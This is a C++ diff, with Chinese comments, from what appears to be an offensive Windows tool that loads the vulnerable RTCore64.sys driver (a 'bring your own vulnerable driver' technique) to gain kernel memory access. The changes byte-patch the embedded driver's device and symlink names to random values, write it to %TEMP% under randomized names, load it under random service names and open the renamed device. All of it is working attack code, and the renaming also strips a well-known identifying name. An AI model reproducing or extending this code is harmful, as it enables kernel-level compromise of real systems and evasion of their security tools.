@@ -350,6 +350,9 @@ bool KernelMemoryAccessor::IsHVCIEnabled() {
 //   1. System32\drivers\<name> (系统已安装)
 //   2. %TEMP%\<name> (从嵌入字节提取)
 // ============================================================
+// ★ v3.87: 存储 patched 后的设备路径, 供 Initialize 读取
+static std::wstring g_patchedDevicePath;
+
 static std::wstring EnsureDriverFile(const std::wstring& driverName) {
     wchar_t sysPath[MAX_PATH];
 
@@ -377,33 +380,73 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
         }
 
         if (embedData && embedSize > 0) {
+            // ★ v3.87: 生成随机设备名, patch 二进制避免 \Device\RTCore64 碰撞
+            //   zombie 设备对象残留时, 原驱动 DriverEntry 调用 IoCreateDevice 必失败
+            //   patch 后每个实例使用唯一设备名, 彻底消除碰撞
+            uint16_t devSuffix = (uint16_t)(rand() & 0xFFFF);
+            wchar_t patchedDevice[32], patchedSymlink[32];
+            swprintf_s(patchedDevice, L"\\Device\\R64_%04X", devSuffix);   // 16 chars + null = 34 bytes
+            swprintf_s(patchedSymlink, L"\\??\\R64_%04X", devSuffix);      // 12 chars + null = 26 bytes
+
+            g_patchedDevicePath = L"\\\\.\\R64_";
+            wchar_t suffixStr[8];
+            swprintf_s(suffixStr, L"%04X", devSuffix);
+            g_patchedDevicePath += suffixStr;
+
+            // 复制嵌入数据到可写 buffer 并 patch
+            std::vector<uint8_t> patchedData(embedData, embedData + embedSize);
+
+            // Patch 1: "\Device\RTCore64" → "\Device\R64_XXXX" (同长度, 34 bytes)
+            const wchar_t* oldDevice = L"\\Device\\RTCore64";
+            size_t oldDeviceBytes = wcslen(oldDevice) * sizeof(wchar_t); // 32 bytes
+            for (size_t i = 0; i + oldDeviceBytes <= patchedData.size(); i++) {
+                if (memcmp(patchedData.data() + i, oldDevice, oldDeviceBytes) == 0) {
+                    memcpy(patchedData.data() + i, patchedDevice, oldDeviceBytes);
+                    ByovdDiag("BYOVD:EnsureDriverFile: patched Device at offset 0x%zX → %ls\n", i, patchedDevice);
+                    break;
+                }
+            }
+
+            // Patch 2: "\??\RTCore64" → "\??\R64_XXXX" (较短的, 用 null 填充)
+            const wchar_t* oldSymlink = L"\\??\\RTCore64";
+            size_t oldSymlinkBytes = wcslen(oldSymlink) * sizeof(wchar_t); // 24 bytes
+            size_t newSymlinkBytes = wcslen(patchedSymlink) * sizeof(wchar_t); // 22 bytes
+            for (size_t i = 0; i + oldSymlinkBytes <= patchedData.size(); i++) {
+                if (memcmp(patchedData.data() + i, oldSymlink, oldSymlinkBytes) == 0) {
+                    memcpy(patchedData.data() + i, patchedSymlink, newSymlinkBytes);
+                    memset(patchedData.data() + i + newSymlinkBytes, 0, oldSymlinkBytes - newSymlinkBytes);
+                    ByovdDiag("BYOVD:EnsureDriverFile: patched Symlink at offset 0x%zX → %ls\n", i, patchedSymlink);
+                    break;
+                }
+            }
+
+            ByovdDiag("BYOVD:EnsureDriverFile: device path = %ls\n", g_patchedDevicePath.c_str());
+
             wchar_t tempPath[MAX_PATH];
             GetTempPathW(MAX_PATH, tempPath);
             wcscat_s(tempPath, driverName.c_str());
 
             // v3.59: 随机化文件名 — 避免 err=32 (上一次驱动未卸载, 文件仍被占用)
-            // 最多重试 5 次不同文件名
             for (int retry = 0; retry < 5; retry++) {
                 wchar_t tryPath[MAX_PATH];
                 GetTempPathW(MAX_PATH, tryPath);
                 if (retry == 0) {
-                    wcscat_s(tryPath, driverName.c_str()); // 首次尝试原名
+                    wcscat_s(tryPath, driverName.c_str());
                 } else {
-                    // 加随机后缀: RTCore64_A1B2.sys
                     wchar_t altName[64];
                     swprintf_s(altName, L"RTCore64_%04X.sys", rand() & 0xFFFF);
                     wcscat_s(tryPath, altName);
                 }
 
-                DeleteFileW(tryPath); // 尝试删除 (忽略失败)
+                DeleteFileW(tryPath);
                 HANDLE hFile = CreateFileW(tryPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
                                            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                 if (hFile != INVALID_HANDLE_VALUE) {
                     DWORD written;
-                    WriteFile(hFile, embedData, (DWORD)embedSize, &written, nullptr);
+                    WriteFile(hFile, patchedData.data(), (DWORD)patchedData.size(), &written, nullptr);
                     FlushFileBuffers(hFile);
                     CloseHandle(hFile);
-                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, embedSize, tryPath, retry);
+                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, patchedData.size(), tryPath, retry);
                     return std::wstring(tryPath);
                 }
                 ByovdDiag("BYOVD:EnsureDriverFile: CreateFileW FAILED for %ls (err=%u, retry=%d)\n", tryPath, GetLastError(), retry);
@@ -413,7 +456,6 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
         }
     }
 
-    // 3. 回退: 返回空 → 尝试以纯文件名加载 (LoadDriver 会补全 System32 路径)
     return L"";
 }
 
@@ -964,6 +1006,12 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     std::wstring resolvedPath = EnsureDriverFile(driver.driverPath);
     const std::wstring& actualPath = resolvedPath.empty() ? driver.driverPath : resolvedPath;
 
+    // ★ v3.87: 如果 EnsureDriverFile patch 了设备名, 更新 m_driverInfo
+    if (!g_patchedDevicePath.empty() && driver.driverPath == L"RTCore64.sys") {
+        m_driverInfo.devicePath = g_patchedDevicePath;
+        ByovdDiag("BYOVD:Init: patched device path → %ls\n", m_driverInfo.devicePath.c_str());
+    }
+
     // 3. ★ v3.76: 始终随机化服务名 — 防止 \Driver\<ServiceName> 僵尸内核对象冲突
     //   之前的逻辑依赖文件名含 '_' 后缀，但 EnsureDriverFile 首试即写原名，
     //   导致 actualServiceName 永远 = "RTCore64Svc"，NtLoadDriver 必返回 0xC0000035
@@ -1092,7 +1140,7 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         if (!LoadDriver(actualServiceName, actualPath)) {
             ByovdDiag("BYOVD:Init: LoadDriver FAILED for %ls (retry)\n", actualServiceName.c_str());
             ByovdDiag("BYOVD:Init: trying to open existing device %ls (driver already in kernel)...\n",
-                driver.devicePath.c_str());
+                m_driverInfo.devicePath.c_str());
             goto try_open_device;
         }
     }
@@ -1100,14 +1148,14 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
 
     // 4. 打开设备 (新加载或复用已存在)
 try_open_device:
-    m_hDevice = CreateFileW(driver.devicePath.c_str(),
+    m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         nullptr, OPEN_EXISTING, 0, nullptr);
 
     if (m_hDevice == INVALID_HANDLE_VALUE) {
         ByovdDiag("BYOVD:Init: CreateFileW FAILED for %ls (err=%u)\n",
-            driver.devicePath.c_str(), GetLastError());
+            m_driverInfo.devicePath.c_str(), GetLastError());
         UnloadDriver(m_actualServiceName);
         return false;
     }
